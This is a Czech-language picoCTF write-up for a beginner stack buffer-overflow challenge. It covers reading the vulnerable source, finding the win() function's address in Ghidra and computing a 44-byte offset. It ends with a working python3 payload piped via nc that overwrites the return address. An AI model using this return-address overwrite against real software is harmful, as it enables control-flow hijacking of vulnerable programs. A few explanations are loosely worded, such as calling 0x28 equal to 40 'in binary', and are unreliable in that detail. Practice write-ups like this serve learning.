----------------------------------------------------------
Popis
Kontrola zpáteční adresy 
Nyní vaříme! 
V programu můžete přetéct vyrovnávací paměť a vrátit se do příznakové funkce. 
Zdrojový kód si můžete prohlédnout zde. 
A připojte se k němu pomocí nc saturn.picoctf.net 60853
----------------------------------------------------------

1. Spusťte instanci

2. Stáhněte si program 'vuln' a zdrojový kód 'vuln.c'.
    
3. Spusťte aplikaci pomocí 'nc saturn.picoctf.net 60853'.
    - Zadejte svůj řetězec: 
        - zadejte kód: test
    - Dobře, je čas se vrátit... Držte nám palce... Skok na 0x804932f
    
    JEDEN DALŠÍ ZKOUŠKA (test, zda se skočená adresa změní při jiném vstupním řetězci)
    - Zadejte prosím svůj řetězec: 
        - Zkuste zadat: jahfnlkanbvoa
    - Dobře, je čas se vrátit... Držte nám palce... Skok na 0x804932f
    
    PŘESKOČENÁ ADRESA JE STEJNÁ
    
4. Zkontrolujte kód 'vuln.c'
    - naší kozou je přetečení gets(buf) na řádku 26, aby se zavolala první funkce win()
        - vypíše nám příznak, který je uložen v souboru "flag.txt"... 
    - define BUFSIZE 32 je dostatečně velký pro zadání dlouhého vstupu
    - Hlavní funkce se skládá z:
        - setvbuf
        - puts zobrazí výzvu pro uživatele, aby mu zadal vstupní řetězec
            - uživatelský vstupní řetězec je pak uložen pod vuln()
                - vuln() je void 
                
5. kontrola adres v nějakém disasembleru
    - GHIDRA
        - Instalace systému Ghidra
            - sudo apt-get install openjdk-17-jdk
            - stáhněte si zdrojový soubor Ghidra
            - chmod +x ghidraRun
            - ./ghidraRun
                - Souhlasím
        - Ghidra je pro tuto výzvu přehnaná, její nástroj CodeBrowser je dostačující
            - otevřít zdrojový soubor 'vuln; v CodeBrowseru a automaticky jej analyzovat
              
    - CodeBrowser
        - levý sloupec - Strom symbolů - Funkce
        - funkce win()
            - adresa: 080491f6
                - to je adresa, kterou potřebujeme získat, abychom získali příznak
        - funkce vuln()
             - uvnitř funkce vuln se dostane funkce, kterou musíme upravit, abychom se dostali k funkci win()
                - 08049297 83 ec 0c SUB ESP,0xc
                    0804929a 8d 45 d8 LEA EAX=>local_2c,[EBP + -0x28]
                    0804929d 50 PUSH EAX
                    0804929e e8 ad fd CALL <EXTERNAL>::gets char * gets(char * __s)
                            ff ff
                - EAX=>local_2c,[EBP + -0x28]
                    - EAX se získá přičtením EBP k -0x28
                        - 0x28 v hexadecimálním tvaru == 40 v binárním tvaru
                        
                        
                                               
6. Přetečení dané aplikace
    - python3 -c "import sys; sys.stdout.buffer.write(b'A'*44+b'\xf6\x91\x04\x08'+b'\n')" | nc saturn.picoctf.net 60853
        - import sys
            - import potřebné knihovny sis
        - sys.stdout.buffer.write
            - pro přepsání adresy v bufferu
        - b'A'*44+b'\xf6\x91\x04\x08'+b'\n'
            - 'A'*44
                - zkratka pro 44 krát znak A 
                    - ve vuln() je EBP + -0x28, jak už víme ... 4 + 40 ... potřebujeme získat 44 znaků například A
            - \xf6\x91\x04\x08 je zpětná adresa, kterou chceme získat (adresa funkce win()).
                - 080491f6
        - nc saturn.picoctf.net 60853
            - pro připojení k dané aplikaci
    - získali jsme příznak :-)
